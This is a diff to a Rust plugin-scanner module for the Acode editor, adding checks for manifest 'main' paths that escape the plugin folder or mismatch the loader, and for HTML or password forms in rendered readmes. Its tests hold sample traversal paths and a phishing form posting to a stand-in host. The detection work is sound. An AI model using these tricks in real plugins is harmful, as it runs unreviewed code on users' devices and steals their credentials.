@@ -1,11 +1,15 @@
 //! plugin.json handling that mirrors Acode's installer and the acode.app
 //! publish checks (`server/apis/plugin.js`).
 
+use std::sync::LazyLock;
+
+use regex::Regex;
 use serde_json::{Map, Value};
 
 use crate::{
     archive::{ArchiveFile, PluginArchive, extension, sanitize_zip_path},
     report::{Finding, PluginSummary, Report},
+    rules,
     severity::{Category, Severity},
 };
 
@@ -155,7 +159,49 @@ fn resolve_entry(
             key.to_string(),
         ));
     }
-    Some(sanitize_zip_path(key))
+
+    // loadPlugin.js doesn't reuse the installer's path: it joins the raw
+    // `main` onto the plugin folder, loads it if that file exists, and
+    // otherwise loads main.js.
+    let installed = sanitize_zip_path(key);
+    let loaded = loader_path(key);
+    if loaded == ".." || loaded.starts_with("../") {
+        report.push(manifest_finding(
+            "manifest.main_escapes_plugin_dir",
+            Severity::Critical,
+            "Acode's loader resolves `main` outside the plugin folder, so the script that runs is not the one in the zip",
+            format!("main = {key:?}: installed as {installed}, loader runs <plugins>/{}", loaded.trim_start_matches("../")),
+        ));
+        return Some(loaded);
+    }
+    if loaded != installed {
+        report.push(manifest_finding(
+            "manifest.main_loader_mismatch",
+            Severity::Medium,
+            "Acode installs `main` at one path but its loader looks for another, so it loads main.js instead",
+            format!("main = {key:?}: installed as {installed}, loader looks for {loaded}"),
+        ));
+        return Some("main.js".to_string());
+    }
+    Some(installed)
+}
+
+/// Path, relative to the plugin folder, that loadPlugin.js loads for `main`.
+/// `Url.join` normalises like Node's `path.join`: `.` and inner `..` collapse,
+/// but a `..` past the start survives and climbs out of the folder. Unlike in
+/// the installer, backslashes are ordinary characters.
+fn loader_path(main: &str) -> String {
+    let mut stack: Vec<&str> = Vec::new();
+    for part in main.split('/') {
+        match part {
+            "" | "." => {}
+            ".." if stack.last().is_some_and(|last| *last != "..") => {
+                stack.pop();
+            }
+            part => stack.push(part),
+        }
+    }
+    stack.join("/")
 }
 
 fn validate_fields(object: &Map<String, Value>, manifest: &PluginManifest, report: &mut Report) {
@@ -240,16 +286,91 @@ fn validate_assets(object: &Map<String, Value>, archive: &PluginArchive, report:
         Some(_) => {}
     }
 
-    if asset(object, archive, "readme", "readme.md").is_none()
-        && archive.by_key("README.md").is_none()
-    {
-        report.push(manifest_finding(
+    let readme =
+        asset(object, archive, "readme", "readme.md").or_else(|| archive.by_key("README.md"));
+    match readme {
+        Some(file) => check_rendered_markdown(file, report),
+        None => report.push(manifest_finding(
             "manifest.missing_readme",
             Severity::Medium,
             "No readme found (checked `readme` and readme.md); acode.app rejects the upload",
             "add readme.md",
-        ));
+        )),
     }
+    if let Some(file) = string_field(object, "changelogs").and_then(|path| archive.by_key(&path)) {
+        check_rendered_markdown(file, report);
+    }
+}
+
+static FORM_TAG: LazyLock<Regex> =
+    LazyLock::new(|| Regex::new(r"(?i)<form\b[^>]*>").expect("valid form pattern"));
+static PASSWORD_INPUT: LazyLock<Regex> = LazyLock::new(|| {
+    Regex::new(r#"(?i)<input\b[^>]*\btype\s*=\s*["']?password"#).expect("valid input pattern")
+});
+static FORM_ACTION: LazyLock<Regex> = LazyLock::new(|| {
+    Regex::new(r#"(?i)\baction\s*=\s*["']?(https?:)?//([^"'\s/>]+)"#).expect("valid action pattern")
+});
+
+static CODE_SPAN: LazyLock<Regex> =
+    LazyLock::new(|| Regex::new(r"(`+)[^`]*?(`+)").expect("valid code span pattern"));
+
+/// Drops fenced code blocks and inline code spans, which markdown-it renders
+/// as escaped text, so documented `<form>` examples don't count.
+fn strip_markdown_code(markdown: &str) -> String {
+    let mut out = String::with_capacity(markdown.len());
+    let mut fence: Option<&str> = None;
+    for line in markdown.lines() {
+        let trimmed = line.trim_start();
+        let marker = ["```", "~~~"]
+            .into_iter()
+            .find(|marker| trimmed.starts_with(marker));
+        match (fence, marker) {
+            (None, Some(marker)) => fence = Some(marker),
+            (Some(open), Some(marker)) if open == marker => fence = None,
+            (None, None) => {
+                out.push_str(&CODE_SPAN.replace_all(line, ""));
+                out.push('\n');
+            }
+            _ => {}
+        }
+    }
+    out
+}
+
+/// The plugin page renders the readme and changelog as HTML through DOMPurify,
+/// which keeps forms and inputs by default, so a readme can show a fake
+/// sign-in form inside Acode.
+fn check_rendered_markdown(file: &ArchiveFile, report: &mut Report) {
+    let text = strip_markdown_code(&String::from_utf8_lossy(&file.bytes));
+    let Some(form) = FORM_TAG.find(&text) else {
+        return;
+    };
+    let action_host = FORM_ACTION
+        .captures(form.as_str())
+        .and_then(|captures| captures.get(2))
+        .map(|host| host.as_str().to_ascii_lowercase());
+    let (id, severity, message) = if PASSWORD_INPUT.is_match(&text) {
+        (
+            "manifest.readme_password_form",
+            Severity::High,
+            "Readme or changelog renders a password form on the plugin page (phishing)",
+        )
+    } else {
+        (
+            "manifest.readme_form",
+            Severity::Medium,
+            "Readme or changelog renders an HTML form on the plugin page",
+        )
+    };
+    let evidence = match &action_host {
+        Some(host) => format!("{}: form posts to {host}", file.path),
+        None => format!("{}: {}", file.path, rules::shorten(form.as_str(), 120)),
+    };
+    report.push(
+        Finding::new(id, severity, Category::Manifest, message, evidence)
+            .with_file(file.path.clone())
+            .keyed(&file.path),
+    );
 }
 
 fn asset<'a>(
@@ -377,6 +498,97 @@ mod tests {
         ]);
         assert!(report.has("manifest.main_fallback"));
         assert_eq!(manifest.unwrap().entry.as_deref(), Some("main.js"));
+    }
+
+    fn manifest_with_main(main: &str) -> Vec<u8> {
+        format!(r#"{{"id":"com.example.ok","name":"Ok","main":{main:?},"version":"1.0.0"}}"#)
+            .into_bytes()
+    }
+
+    #[test]
+    fn main_climbing_out_of_plugin_dir_is_critical() {
+        let json = manifest_with_main("../victim/main.js");
+        let (manifest, report) = load_zip(&[
+            ("plugin.json", &json),
+            ("../victim/main.js", b"reviewed code"),
+            ICON,
+            README,
+        ]);
+        assert!(report.has("manifest.main_escapes_plugin_dir"));
+        // The installer wrote victim/main.js inside the plugin folder, but the
+        // loader runs <plugins>/victim/main.js.
+        assert_eq!(
+            manifest.unwrap().entry.as_deref(),
+            Some("../victim/main.js")
+        );
+    }
+
+    #[test]
+    fn backslash_main_makes_loader_fall_back() {
+        let json = manifest_with_main("dist\\main.js");
+        let (manifest, report) = load_zip(&[
+            ("plugin.json", &json),
+            ("dist\\main.js", b"shown to reviewers"),
+            ("main.js", b"actually runs"),
+            ICON,
+            README,
+        ]);
+        assert!(report.has("manifest.main_loader_mismatch"));
+        assert_eq!(manifest.unwrap().entry.as_deref(), Some("main.js"));
+    }
+
+    #[test]
+    fn inner_dot_segments_in_main_are_harmless() {
+        let json = manifest_with_main("dist/../main.js");
+        let (manifest, report) = load_zip(&[
+            ("plugin.json", &json),
+            ("dist/../main.js", b""),
+            ICON,
+            README,
+        ]);
+        assert!(!report.has("manifest.main_escapes_plugin_dir"));
+        assert!(!report.has("manifest.main_loader_mismatch"));
+        assert_eq!(manifest.unwrap().entry.as_deref(), Some("main.js"));
+    }
+
+    #[test]
+    fn flags_forms_in_rendered_readme() {
+        let json = manifest_with_main("main.js");
+        let phishing = b"# Setup\n<form action=\"https://acode-login.example/\"><input name=u><input type=password name=p><button>Sign in</button></form>";
+        let (_, report) = load_zip(&[
+            ("plugin.json", &json),
+            ("main.js", b""),
+            ICON,
+            ("readme.md", phishing),
+        ]);
+        assert!(report.has("manifest.readme_password_form"));
+        assert!(
+            report
+                .findings
+                .iter()
+                .any(|finding| finding.evidence.contains("acode-login.example"))
+        );
+
+        let json = br#"{"id":"com.example.ok","name":"Ok","main":"main.js","version":"1.0.0","changelogs":"CHANGELOG.md"}"#;
+        let (_, report) = load_zip(&[
+            ("plugin.json", json),
+            ("main.js", b""),
+            ICON,
+            README,
+            ("CHANGELOG.md", b"<form><input name=email></form>"),
+        ]);
+        assert!(report.has("manifest.readme_form"));
+
+        let (_, report) = load_zip(&[
+            ("plugin.json", &manifest_with_main("main.js")),
+            ("main.js", b""),
+            ICON,
+            (
+                "readme.md",
+                b"Use `<form>` tags in **HTML** files.\n\n```html\n<input type=\"text\">\n```",
+            ),
+        ]);
+        assert!(!report.has("manifest.readme_form"));
     }
 
     #[test]
